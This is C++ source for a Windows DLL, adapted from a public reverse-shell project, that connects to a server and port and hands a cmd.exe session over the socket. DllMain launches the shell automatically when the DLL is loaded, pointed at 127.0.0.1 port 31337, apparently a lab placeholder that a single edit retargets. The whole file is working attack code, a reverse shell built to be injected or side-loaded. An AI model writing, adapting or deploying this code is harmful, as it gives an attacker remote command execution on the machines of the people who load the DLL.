// Based loosely on https://github.com/dev-frog/C-Reverse-Shell/blob/master/re.cpp
// and https://www.winsocketdotnetworkprogramming.com/winsock2programming/winsock2advancedcode1d.html

#include "pch.h"
#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define BUFLEN 1024

int shell(LPWSTR server, unsigned int port) {
    WSADATA version;
    SOCKET socket;
    sockaddr_in addr;

    // Start the winsocket API
    //* https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
    WSAStartup(MAKEWORD(2, 2), &version);

    // Setup socket
    //* https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
    //* https://docs.microsoft.com/en-us/windows/win32/winsock/sockaddr-2
    //* https://docs.microsoft.com/en-us/windows/win32/api/winsock2/ns-winsock2-in_addr
    //* https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/nf-ws2tcpip-inetptonw
    socket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
    addr.sin_family = AF_INET;
    InetPtonW(AF_INET, server, &(addr.sin_addr.s_addr)); // Original has sin_addr.s_addr
    addr.sin_port = htons(port);

    // Attempt to connect
    //* https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
    //* https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-closesocket
    //* https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsacleanup
    if(WSAConnect(socket, (SOCKADDR*)&addr, sizeof addr, NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(socket);
        WSACleanup();
        return -1;
    }
    
    // Start shell
    //* https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/ns-processthreadsapi-startupinfoa
    //* https://docs.microsoft.com/en-us/windows/win32/learnwin32/working-with-strings
    //* https://docs.microsoft.com/en-us/cpp/code-quality/c6335?view=vs-2019
    STARTUPINFO sinfo;
    PROCESS_INFORMATION pinfo;
    wchar_t commandName[] = L"cmd.exe";
    memset(&sinfo, 0, sizeof sinfo);
    sinfo.cb = sizeof sinfo;
    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW); // Tell it which other properties we're using
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)socket; // Set all I/O to the socket
    CreateProcessW(NULL, commandName, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

    // Clean up after reverse shell process completes
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    closesocket(socket);
    WSACleanup();

    return 0;
}
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch(ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            shell((LPWSTR)L"127.0.0.1", 31337);
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}